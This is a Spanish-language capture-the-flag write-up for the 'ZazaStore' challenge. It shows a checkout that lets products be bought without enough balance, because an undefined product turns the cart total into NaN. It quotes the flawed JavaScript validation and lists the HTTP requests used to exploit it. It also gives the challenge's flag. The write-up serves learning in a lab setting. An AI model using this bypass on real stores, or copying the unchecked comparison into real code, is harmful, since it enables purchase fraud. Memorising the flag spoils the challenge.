# ZazaStore CTF — Wrap-up

**Clasificación**: CWE-1025 — Comparison Using Wrong Factors

## Resumen

Se identificó una vulnerabilidad de manipulación de precios en una app de e-commerce. La validación del total de compra en el servidor asume que el total siempre es un número. Al inyectar un producto no definido en el diccionario de precios, se genera un valor `NaN` que pasa la validación, permitiendo comprar productos costosos sin suficiente dinero en cuenta.

## Flag

[Código para conseguir la flag automáticamente](./script.py)
```
pascalCTF{w3_l1v3_f0r_th3_z4z4}
```

## Proceso

### 1. Análisis de la lógica de compra

Se identificó que la sesión almacena el carrito y la validación ocurre en el servidor mediante cálculo del total con el diccionario `prices`.

### 2. Identificación del vector

Se observó que agregar un producto inexistente en el diccionario de precios genera un total de NaN, bypaseando la validación de balance.

El código vulnerable es:
```javascript
const prices = { "FakeZa": 1, "ElectricZa": 65, "CartoonZa": 35, "RealZa": 1000 };

// En /checkout
let total = 0;
for (const product in cart) {
    total += prices[product] * cart[product];
}
if (total > req.session.balance) {
    res.json({ "success": true, "balance": "Insufficient Balance" });
}
```
La validación `if (total > balance)` no valida el tipo de `total`. Cuando se multiplica `undefined * quantity`, el resultado es `NaN`. La comparación `NaN > 100` retorna `false`, haciendo que la validación pase y la compra sea exitosa.


### 3. Explotación

Se explotó la vulnerabilidad agregando un producto inexistente al carrito.

```python
# 1. Agregar RealZa (1000$) - la flag
POST /add-cart
{"product": "RealZa", "quantity": 1}

# 2. Agregar producto inexistente
POST /add-cart
{"product": "InvalidProduct123", "quantity": 1}

# 3. El total en checkout = NaN (pasa validación)
POST /checkout
{}

# 4. Obtener flag del inventario
GET /inventory
# RealZa se compra sin pagar
```

El producto RealZa (que contiene la flag) se compra exitosamente sin validación de precio.

### 4. Extracción de la flag
Se parseó el HTML de `/inventory` usando BeautifulSoup para extraer la flag del contenido renderizado en el elemento `<div class="content-value">`.
